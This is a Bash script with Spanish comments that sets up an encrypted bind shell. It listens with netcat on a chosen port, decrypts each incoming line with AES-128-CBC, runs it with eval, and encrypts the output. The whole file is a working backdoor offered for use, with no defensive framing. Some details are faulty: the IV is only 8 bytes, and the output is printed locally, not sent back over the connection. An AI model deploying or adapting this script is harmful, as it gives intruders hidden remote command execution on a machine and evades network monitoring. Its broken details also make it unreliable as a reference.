#!/bin/bash

IP="0.0.0.0"  # Cambia a la IP que deseas vincular
PORT=12345  # Cambia al puerto deseado
KEY=$(openssl rand -hex 16)  # Genera una clave AES de 128 bits (32 hexadecimales)
IV=$(openssl rand -hex 8)  # Genera un IV de 64 bits (16 hexadecimales)

echo "AES Key: $KEY"
echo "AES IV: $IV"

nc -lvk $IP $PORT | while read -r encrypted_data; do
    # Desencriptar el comando recibido
    decrypted_command=$(echo "$encrypted_data" | openssl enc -aes-128-cbc -d -a -K $KEY -iv $IV 2>/dev/null)
    if [[ "$decrypted_command" == "exit" ]]; then
        echo "[*] Cliente cerró la conexión."
        break
    fi

    command_output=$(eval "$decrypted_command" 2>&1)
    encrypted_output=$(echo -n "$command_output" | openssl enc -aes-128-cbc -a -K $KEY -iv $IV 2>/dev/null)
    echo "$encrypted_output"
done
